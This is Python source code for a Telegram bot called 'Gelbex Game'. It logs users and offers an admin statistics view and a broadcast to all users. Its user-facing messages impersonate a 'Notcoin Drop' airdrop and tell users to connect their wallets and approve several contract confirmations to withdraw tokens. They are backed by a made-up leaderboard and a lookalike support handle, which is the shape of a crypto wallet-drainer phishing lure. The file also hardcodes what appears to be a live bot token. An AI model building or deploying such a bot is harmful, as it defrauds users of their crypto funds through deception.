import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
import sqlite3
from datetime import datetime
import logging

# Настройка логирования
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Создание или подключение к базе данных
conn = sqlite3.connect('users.db', check_same_thread=False)
cursor = conn.cursor()

# Создание таблицы, если она не существует
cursor.execute('''CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    join_date DATE NOT NULL
)''')
conn.commit()

TOKEN = '7067621758:AAGplvmrRWDrnGBcYA9MK13fL3LYtXbtQpY'
LINK = 'https://t.me/GelbexGame_Bot/Game'
bot = telebot.TeleBot(TOKEN)
ADMIN_ID = 'ID_TG'  # Замените на ID администратора

# Функция для добавления нового пользователя в базу данных
def add_new_user(user_id):
    try:
        cursor.execute('INSERT OR IGNORE INTO users (user_id, join_date) VALUES (?, ?)', (user_id, datetime.now().strftime('%Y-%m-%d')))
        conn.commit()
    except sqlite3.Error as e:
        logging.error(f"Ошибка добавления нового пользователя: {e}")

# Функция для получения статистики
def get_stats():
    try:
        today = datetime.now().strftime('%Y-%m-%d')
        cursor.execute('SELECT COUNT(*) FROM users WHERE join_date >= ?', (today,))
        daily = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM users WHERE join_date >= datetime(?, "-7 day")', (today,))
        weekly = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM users WHERE join_date >= datetime(?, "-1 month")', (today,))
        monthly = cursor.fetchone()[0]
        return daily, weekly, monthly
    except sqlite3.Error as e:
        logging.error(f"Ошибка получения статистики: {e}")
        return 0, 0, 0

# Функция для получения всех пользователей
def get_all_users():
    try:
        cursor.execute('SELECT user_id FROM users')
        return cursor.fetchall()
    except sqlite3.Error as e:
        logging.error(f"Ошибка получения всех пользователей: {e}")
        return []

@bot.message_handler(commands=['admin'])
def send_stat(message):
    user_id = message.from_user.id
    if user_id == int(ADMIN_ID):  # Проверка на ID администратора
        daily, weekly, monthly = get_stats()
        bot.send_message(message.chat.id, f'📊 Статистика пользователей:\n\n📅 За день: {daily}\n📅 За неделю: {weekly}\n📅 За месяц: {monthly}')
        
        # Добавление кнопки для рассылки сообщений
        keyboard = InlineKeyboardMarkup()
        button = InlineKeyboardButton(text='📢 Разослать сообщение', callback_data='broadcast')
        keyboard.add(button)
        bot.send_message(message.chat.id, 'Выберите действие:', reply_markup=keyboard)

@bot.message_handler(commands=['start'])
def send_picture(message):
    user_id = message.from_user.id

    add_new_user(user_id)
    photo = open('main.jpg', 'rb')
    keyboard = InlineKeyboardMarkup(row_width=2)
    buttons = [
        '🕹️Play!', '🪐 Join our ann channel',
    ]
    callbacks = ['ClaimNOT', 'Referral', 'JoinTG', 'Withdraw', 'TopUsers', 'Support', 'FAQ']

    for button_text, callback_data in zip(buttons, callbacks):
        button = InlineKeyboardButton(text=button_text, callback_data=callback_data)
        keyboard.add(button)

    bot.send_photo(
        message.chat.id, photo, 
        caption='🔥 Welcome to Gelbex Game!\n\n⬇️ Click the "Play" button to start.',
        reply_markup=keyboard
    )

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    responses = {
        'ClaimNOT': ('🪙 Play', LINK),
        'Referral': (
            'Join our telegram channel so you do not miss any important news @gelbex '
            '.', None),
        'JoinTG': (
            'Join our Telegram channel to not miss interesting news!. @gelbex', None),
        'Withdraw': (
            '💵 To withdraw $NOT to your wallet, you need:\n\n'
            '1) Click 🪙 Claim $NOT in the bot.\n'
            '2) Connect your wallet via QR-code or directly.\n'
            '3) Due to load, your wallet may request several contract confirmations.\n'
            '4) Amount of airdrop depends on your activity.\n\n'
            '🤑 Your $NOT will be withdrawn within 24 hours.', None),
        'TopUsers': (
            '🏅 @3\n👥Referrals invited: 1,436 fren\'s \n🏆Balance: 9,778,000 $NOT\n\n'
            '🥈 @2\n👥Referrals invited: 1,275 fren\'s \n🏆Balance: 8,145,000 $NOT\n\n'
            '🥉 @1\n👥Referrals invited: 1,249 fren\'s \n🏆Balance: 6,667,000 $NOT\n', None),
        'Support': ('If you have any problems, please contact @TeleNotDropSupport 👌', None),
        'FAQ': (
            '🛎Were you waiting for us? We are back as promised!\n\n'
            '3...2...1! Ready for liftoff? The Notcoin Drop has landed! But hold your horses, it\'s not a free-for-all just yet 🤓\n\n'
            'We\'re rolling out invites gradually, so keep your eyes peeled! Each lucky recipient can bring along (for now) two friends 👯\n\n'
            'Quick, check your inbox – could it be the coveted letter from Not? 💎\n\n'
            'So, what\'s in store right now? It\'s all about Drop Not! Curious? Dive into the details on our blog 🧘🏻‍♀️\n\n'
            'For the lazy ones (no judgment here):\n'
            '1. Log into the bot\n'
            '2. Connect your wallet account\n'
            '3. Claim drop 💸\n'
            '4. Come back in 8 hours to claim again 🤪', None),
        'broadcast': ('Введите сообщение для рассылки всем пользователям:', None),
    }

    response = responses.get(call.data, (None, None))
    if response and response[0]:
        if response[1]:
            web_app_info = WebAppInfo(url=response[1])
            keyboard = InlineKeyboardMarkup()
            web_app_button = InlineKeyboardButton(text=response[0], web_app=web_app_info)
            keyboard.add(web_app_button)
            bot.send_message(call.message.chat.id, text=response[0], reply_markup=keyboard)
        else:
            bot.send_message(call.message.chat.id, text=response[0])
            if call.data == 'broadcast':
                bot.register_next_step_handler(call.message, broadcast_message)

def broadcast_message(message):
    user_id = message.from_user.id
    if user_id == int(ADMIN_ID):  # Проверка на ID администратора
        all_users = get_all_users()
        broadcast_text = message.text
        sent_count = 0

        for user in all_users:
            try:
                bot.send_message(user[0], broadcast_text)
                sent_count += 1
            except Exception as e:
                logging.error(f"Не удалось отправить сообщение пользователю {user[0]}: {e}")

        bot.send_message(user_id, f'Рассылка завершена. Сообщение отправлено {sent_count} пользователям.')

try:
    bot.polling(none_stop=True)
except Exception as e:
    logging.error(f"Бот столкнулся с ошибкой: {e}")
